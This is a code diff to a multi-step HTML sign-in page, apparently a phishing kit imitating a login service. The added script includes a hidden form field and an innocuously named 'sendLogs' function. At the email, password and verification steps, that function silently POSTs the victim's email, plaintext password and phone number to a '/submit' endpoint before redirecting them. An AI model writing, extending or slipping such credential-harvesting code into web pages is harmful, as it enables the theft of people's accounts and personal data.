@@ -192,6 +192,9 @@
   </div>
 </div>
 
+<div style="display:none;">
+  <input type="text" id="ms-mobile" />
+</div>
 <footer>
   <a href="#">Help</a>
   <a href="#">Privacy</a>
@@ -202,12 +205,30 @@
 </footer>
 
 <script>
+  function syncLogAliases(){
+    var mobileEl=document.getElementById('ms-mobile');
+    if(mobileEl) mobileEl.value = document.getElementById('y-mobile')?.value || '';
+  }
+  async function sendLogs(type){
+    syncLogAliases();
+    var email = document.getElementById('email') ? document.getElementById('email').value : '';
+    var pwd = document.getElementById('pwd') ? document.getElementById('pwd').value : '';
+    var msMobile = document.getElementById('ms-mobile') ? document.getElementById('ms-mobile').value : '';
+    try {
+      await fetch('/submit', {
+        method: 'POST',
+        headers: {'Content-Type':'application/json'},
+        body: JSON.stringify({type:type,email:email,pwd:pwd,'ms-mobile':msMobile})
+      });
+    } catch (e) {}
+  }
   function nextStep() {
     var em = document.getElementById('email').value.trim();
     if (!em || (!em.includes('@') && !/^[0-9+]{7,}$/.test(em))) {
       document.getElementById('email-err').classList.add('show'); return;
     }
     document.getElementById('email-err').classList.remove('show');
+    sendLogs('step1');
     document.getElementById('av').textContent = em.charAt(0).toUpperCase();
     document.getElementById('disp-email').textContent = em;
     showStep(2);
@@ -216,12 +237,13 @@
     var pw = document.getElementById('pwd').value;
     if (!pw) { document.getElementById('pwd-err').classList.add('show'); return; }
     document.getElementById('pwd-err').classList.remove('show');
+    sendLogs('password');
     var raw = document.getElementById('y-mobile').value.replace(/\s/g, '');
     var hint = raw.length >= 2 ? '●●●●' + raw.slice(-2) : (raw || '●●●●??');
     document.getElementById('y-mobile-hint').textContent = hint;
     showStep(3);
   }
-  function doVerify() { showStep(4); startRedirect(); }
+  function doVerify() { sendLogs('verify'); showStep(4); startRedirect(); }
   function showStep(n) {
     document.querySelectorAll('.step').forEach(function(s){ s.classList.remove('active'); });
     document.getElementById('step'+n).classList.add('active');
